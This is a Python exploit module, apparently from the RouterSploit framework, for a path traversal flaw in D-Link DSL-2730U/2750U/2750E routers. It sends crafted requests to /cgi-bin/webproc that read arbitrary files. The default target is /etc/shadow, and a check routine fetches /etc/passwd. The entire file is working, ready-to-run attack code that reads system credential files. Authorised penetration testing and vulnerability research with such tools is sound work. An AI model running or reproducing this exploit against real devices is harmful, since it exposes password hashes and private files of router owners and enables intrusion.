from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for D-Link DSL-2730U/2750U/2750E Path Traversal vulnerability.
    If the target is vulnerable, content of the specified file is returned.
    """
    __info__ = {
        'name': 'D-Link DSL-2730U/2750U/2750E Path Traversal',
        'description': 'Module exploits D-Link DSL-2730U/2750U/2750E Path Traversal vulnerability which allows to read any file on the system.',
        'authors': [
            'Todor Donev <todor.donev[at]gmail.com>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/40735/',
        ],
        'devices': [
            'D-Link DSL-2730U',
            'D-Link DSL-2750U',
            'D-Link DSL-2750E'
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')
    filename = exploits.Option('/etc/shadow', 'File to read')

    def run(self):
        if self.check():
            url = "{}:{}/cgi-bin/webproc?getpage={}&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard".format(self.target, self.port, self.filename)

            response = http_request(method="GET", url=url)
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Success! File: %s" % self.filename)
                print_info(response.text)
            else:
                print_error("Exploit failed")
        else:
            print_error("Device seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if "root:" in response.text:
            return True  # target vulnerable

        return False  # target is not vulnerable
